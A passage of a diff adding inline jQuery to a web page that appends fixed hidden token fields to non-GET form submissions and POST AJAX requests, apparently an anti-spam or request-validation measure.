+if ($(form).attr("method") != "get") { $(form).append('<input type="hidden" name="lwtSkf" value="zn]KPc" />'); }
+if ($(form).attr("method") != "get") { $(form).append('<input type="hidden" name="WkBXNnJrjCgZ" value="z4pcL_BkhJrt" />'); }
+            }
+
+            
+            $(document).on('submit', 'form', function () {
+		        if ($(this).attr("method") != "get") { $(this).append('<input type="hidden" name="oxRncT" value="50vXF*" />'); }
+if ($(this).attr("method") != "get") { $(this).append('<input type="hidden" name="cdqOaSZsTxGhKoU" value="6TiS7H4uZQc@wWy" />'); }
+if ($(this).attr("method") != "get") { $(this).append('<input type="hidden" name="lwtSkf" value="zn]KPc" />'); }
+if ($(this).attr("method") != "get") { $(this).append('<input type="hidden" name="WkBXNnJrjCgZ" value="z4pcL_BkhJrt" />'); }
+                return true;
+            });
+
+	        
+            jQuery.ajaxSetup({
+                beforeSend: function (e, data) {
+
+                    //console.log(Object.getOwnPropertyNames(data).sort());
+                    //console.log(data.type);
+
+                    if (data.type !== 'POST') return;
+
+                    if (typeof data.data === 'object' && data.data !== null) {
+	                    data.data.append("oxRncT", "50vXF*");
+data.data.append("cdqOaSZsTxGhKoU", "6TiS7H4uZQc@wWy");
+data.data.append("lwtSkf", "zn]KPc");
+data.data.append("WkBXNnJrjCgZ", "z4pcL_BkhJrt");
+                    }
+                    else {
+                        data.data =  data.data + '&oxRncT=50vXF*&cdqOaSZsTxGhKoU=6TiS7H4uZQc@wWy&lwtSkf=zn]KPc&WkBXNnJrjCgZ=z4pcL_BkhJrt';
+                    }
+                }
+            });
+
+        });
+    </script>
+	</body></html>
